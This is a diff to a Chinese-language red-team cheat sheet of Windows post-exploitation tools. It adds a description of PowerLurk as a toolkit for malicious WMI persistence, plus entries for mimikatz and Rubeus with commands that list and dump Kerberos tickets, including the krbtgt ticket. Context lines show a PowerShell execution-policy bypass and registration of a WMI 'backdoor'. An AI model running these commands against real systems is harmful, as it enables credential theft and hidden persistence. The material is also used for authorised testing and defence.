@@ -105,7 +105,8 @@ SharpUp.exe audit ModifiableServiceBinaries
 ---
 # 10.PowerLurk-master
 * 项目地址：https://github.com/Sw4mpf0x/PowerLurk
-* 项目用处：
+* 项目用处：构建恶意 WMI 事件订阅的 PowerShell 工具集（持久化）
+* 简单用法：
 ```
 本地导入：
 PS> powershell.exe -NoP -Exec ByPass -C Import-Module c:\\temp\\PowerLurk.ps1
@@ -127,7 +128,23 @@ Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Users\ls
 Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
 ```
 
+# 11.mimikatz
+* 项目地址：https://github.com/gentilkiwi/mimikatz
+* 项目用处：无需解释
 
+# 12.Rubeus
+* 项目地址：https://github.com/GhostPack/Rubeus
+* 项目用处：用于 Windows Kerberos 黄金票据攻击、Silver Ticket 攻击、票据转储和其他相关攻击的开源工具
+* 简单用法：
+```
+#列出当前登录会话中的所有 Kerberos 票证，如果提升，则列出计算机上所有登录会话中的所有 Kerberos 票证。
+Rubeus.exe triage
+
+#从内存中提取 tgt
+Rubeus.exe dump /luid:0x7049f /service:krbtgt
+#如果没有/luid:0x7049f /service:krbtgt，Rubeus 将提取所有可能的票证
+
+```
 
 
 
